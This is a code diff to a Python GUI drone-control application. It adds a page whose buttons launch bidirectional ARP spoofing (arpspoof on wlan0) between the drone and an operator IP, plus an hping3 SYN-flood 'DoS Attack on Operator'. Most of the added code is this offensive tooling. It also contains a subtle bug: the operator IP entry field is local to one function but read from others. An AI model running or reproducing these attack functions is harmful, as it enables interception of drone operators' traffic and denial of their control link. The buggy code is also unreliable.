@@ -20,6 +20,7 @@ from fpdf import FPDF
 import os
 import webbrowser
 import datetime
+import re
 
 current_time = datetime.datetime.now()
 
@@ -844,16 +845,105 @@ def DroneControllerPage():
     button_land = customtkinter.CTkButton(master=frame13, text="Land 🛬", command=lambda: send_command("land"))
     button_land.grid(row=7, column=270, padx=(5,20), pady=(20,3))
         
-    button_camera = customtkinter.CTkButton(master=frame13, text="Turn On Camera 📷", command=lambda:send_command("turnoncamera"))
-    button_camera.grid(row=7, column=250, padx=5, pady=(20,3))
     
-    NXTbutton = customtkinter.CTkButton(master=frame13, text="Next", command=REP_GEN)
-    NXTbutton.grid(row=8, column=270, padx=(5,20), pady=(30,0))
+    
+    NXTbutton = customtkinter.CTkButton(master=frame13, text="Next", command=cam)
+    NXTbutton.grid(row=7, column=250, padx=5, pady=(20,3))
         
         #Log text area
     global log_text
     log_text = customtkinter.CTkTextbox(master=frame13, height=200, width=400)
     log_text.grid(row=4, column=250,  padx=20, pady=20)
+    
+def cam():
+    frame13.destroy()
+    global frame17
+    frame17 = customtkinter.CTkFrame(master=root)
+    frame17.pack(pady=20, padx=60, fill="both", expand=True)
+    
+    button_camera = customtkinter.CTkButton(master=frame17, text="Turn On Camera 📷", command=lambda:send_command("turnoncamera"))
+    button_camera.pack(padx=120, pady=(200,10))
+    
+    NXTbutton = customtkinter.CTkButton(master=frame17, text="Next", command=arp)
+    NXTbutton.pack(padx=120, pady=(180,5))
+        
+#****************************************************************************************
+#****************************************************************************************
+#**************************************ARP***********************************************
+#****************************************************************************************
+# Regular expression for validating IPv4 addresses
+ipv4_regex = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
+
+def validate_ip(ip):
+    return bool(re.match(ipv4_regex, ip))
+
+def start_arp_spoof():
+    operator_ip = operator_entry.get()
+
+    if not validate_ip(operator_ip):
+        CTkMessagebox(title="Alert", message="Invalid IP address. Please enter a valid IPv4 address for the operator.",
+                      icon="cancel")
+        print("Invalid IP address. Please enter a valid IPv4 address for the operator.")
+        return
+
+    command1 = f"arpspoof -i wlan0 -t {drone_ip} {operator_ip}"
+    command2 = f"arpspoof -i wlan0 -t {operator_ip} {drone_ip}"
+
+    global arp_spoof_process1, arp_spoof_process2
+    arp_spoof_process1 = subprocess.Popen(command1, shell=True)
+    arp_spoof_process2 = subprocess.Popen(command2, shell=True)
+
+    CTkMessagebox(title="Success", message="ARP Spoofing is running. Use Wireshark to analyze captured packets.",
+                  icon="check")
+
+def stop_arp_spoof():
+    if arp_spoof_process1:
+        arp_spoof_process1.terminate()
+    if arp_spoof_process2:
+        arp_spoof_process2.terminate()
+    CTkMessagebox(title="Success", message="ARP Spoofing has been stopped.", icon="check")
+
+def start_dos_attack():
+    operator_ip = operator_entry.get()
+
+    if not validate_ip(operator_ip):
+        CTkMessagebox(title="Alert", message="Invalid IP address. Please enter a valid IPv4 address for the operator.",
+                      icon="cancel")
+        print("Invalid IP address. Please enter a valid IPv4 address for the operator.")
+        return
+
+    dos_command = f"hping3 -S --flood -V {operator_ip}"
+    subprocess.Popen(dos_command, shell=True)
+    CTkMessagebox(title="Success", message="DoS attack is running on the operator IP.", icon="check")
+
+def arp():
+    frame17.destroy()
+    global frame18
+    frame18 = customtkinter.CTkFrame(master=root)
+    frame18.pack(pady=20, padx=60, fill="both", expand=True)
+    
+    drone_label = customtkinter.CTkLabel(frame18, text=f"Drone IP:  {drone_ip}")
+    drone_label.pack(padx=(0,30) , pady=5)
+
+    operator_label = customtkinter.CTkLabel(frame18, text="Operator IP  ")
+    operator_label.pack(padx=(0,60) , pady=5, anchor="c")
+    
+    operator_entry = customtkinter.CTkEntry(frame18)
+    operator_entry.pack(padx=5 , pady=5)
+
+    start_arp_button = customtkinter.CTkButton(frame18, text="Start ARP Spoofing", command=start_arp_spoof)
+    start_arp_button.pack(padx=150 , pady=10)
+
+    stop_arp_button = customtkinter.CTkButton(frame18, text="Stop ARP Spoofing", command=stop_arp_spoof)
+    stop_arp_button.pack(padx=150 , pady=(5,10))
+
+    start_dos_button = customtkinter.CTkButton(frame18, text="Start DoS Attack on Operator", command=start_dos_attack)
+    start_dos_button.pack(padx=170 , pady=(5,10))
+    
+    NXTbutton = customtkinter.CTkButton(master=frame18, text="Next", command=REP_GEN)
+    NXTbutton.pack(padx=150 , pady=(150,10))
+
+
         
 #****************************************************************************************
 #****************************************************************************************
@@ -928,7 +1018,7 @@ def generate_report():
 
 
 def REP_GEN():
-    frame13.destroy()
+    frame18.destroy()
     global frame16
     frame16 = customtkinter.CTkFrame(master=root)
     frame16.pack(pady=20, padx=60, fill="both", expand=True)
